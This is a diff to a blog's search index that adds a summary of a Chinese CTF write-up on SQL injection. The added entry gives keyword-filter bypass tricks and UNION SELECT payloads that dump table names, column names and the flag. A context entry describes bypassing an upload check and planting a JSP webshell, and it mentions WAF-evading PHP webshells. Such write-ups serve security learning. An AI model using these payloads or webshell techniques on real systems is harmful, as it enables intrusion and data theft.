@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[百度杯CTF夺旗大赛9月场第二场SQL]]></title>
+    <url>%2F2018%2F05%2F02%2F%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%BA%8C%E5%9C%BASQL%2F</url>
+    <content type="text"><![CDATA[首先看看是否有字符过滤把所有字符串都试一遍 1/index.php?id = 1~!@$%^&amp;*()_+-=&#123;&#125;[]&apos;&quot;;&lt;&gt;/? 发现&lt;&gt;直接被删除，即是：sele&lt;&gt;ct --&gt; select符号+被替换为空格等等 获取当前表的字段个数：1?id=1 ord&lt;&gt;er by 3 正常返回 联合注入，获取可以显示的字段1?id=1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 执行之后，第二个字段被显示出来，说明三个字段只有第二个字段可以显示。 爆表名1?id=1 union selec&lt;&gt;t 1,group_concat(table_name),3 from information_schema.tables where table_schema =database() 爆出 info 表 爆列名1?id=1 union selec&lt;&gt;t 1,group_concat(column_name),3 from information_schema.columns where table_name= &apos;info&apos; 1id,title,flAg_T5ZNdrm 爆flag1?id=1 union selec&lt;&gt;t 1,group_concat(flAg_T5ZNdrm),3 from info flag 1flag&#123;1d80a990-37a8-48e2-9fd5-a4de39cbcf60&#125;,test 参考链接https://www.cnblogs.com/wangleiblog/p/5924451.html sql注入字符绕过方法： sql注入实例一枚：]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>I春秋</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[红帽杯Web-simple_upload]]></title>
     <url>%2F2018%2F05%2F02%2F%E7%BA%A2%E5%B8%BD%E6%9D%AFWeb-simple-upload%2F</url>
     <content type="text"><![CDATA[simple upload这次在你面前的网站的功能非常简单，接受挑战吧！ 0x01 抓包发现admin=0，改为1登录 0x02 文件上传只要把Content-Type 改为image/jpeg就可以绕过 0x03 上传木马测试了php，asp都不行，最后用jsp 在根目录发现flag，下载 Jsp webshell:https://github.com/dingody/jspy 一句话木马和中国菜刀的结合拿webshell 2016年11月整理的最新php免杀一句话木马, 2017php免杀一句话(php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话,php过waf一句话) 整理的最新WebSHell (php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话)]]></content>
